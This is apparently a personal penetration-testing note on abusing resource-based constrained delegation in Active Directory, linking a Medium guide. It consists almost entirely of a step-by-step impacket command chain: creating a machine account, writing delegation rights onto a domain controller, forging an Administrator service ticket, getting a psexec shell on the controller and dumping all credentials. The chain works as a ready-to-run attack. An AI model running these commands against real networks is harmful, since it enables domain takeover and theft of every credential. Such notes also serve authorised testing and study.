[https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5](https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5)
- in my use case, i had a user that had GenericWrite over DC01
![image 411.png](../../assets/RBCD/image%20411.png)
  
impacket-addcomputer -computer-name ‘<can_be_whatever>’ -computer-pass ‘<can_be_whatever>’ -dc-ip <IP> <DOMAIN>/<user>:<pass>
![image 1 306.png](../../assets/RBCD/image%201%20306.png)
  
impacket-rbcd -delegate-to ‘<DC_name$>’ -delegate-from ‘<machine_from_above>’ -dc-ip <IP> -action write <DOMAIN>/<user>:<pass>
![image 2 257.png](../../assets/RBCD/image%202%20257.png)
![image 3 219.png](../../assets/RBCD/image%203%20219.png)
  
impacket-getST -spn cifs/<computer.DOMAIN> -impersonate Administrator -dc-ip <IP> <DOMAIN>/<computer_from_above>:<computer_pass>
![image 4 190.png](../../assets/RBCD/image%204%20190.png)
  
export KRB5CCNAME=<administrator_ccache>
impacket-psexec -k -no-pass <DOMAIN>/administrator@<computer.DOMAIN>
![image 5 176.png](../../assets/RBCD/image%205%20176.png)
![image 6 150.png](../../assets/RBCD/image%206%20150.png)
  
run secrets-dump to get all creds
![image 7 139.png](../../assets/RBCD/image%207%20139.png)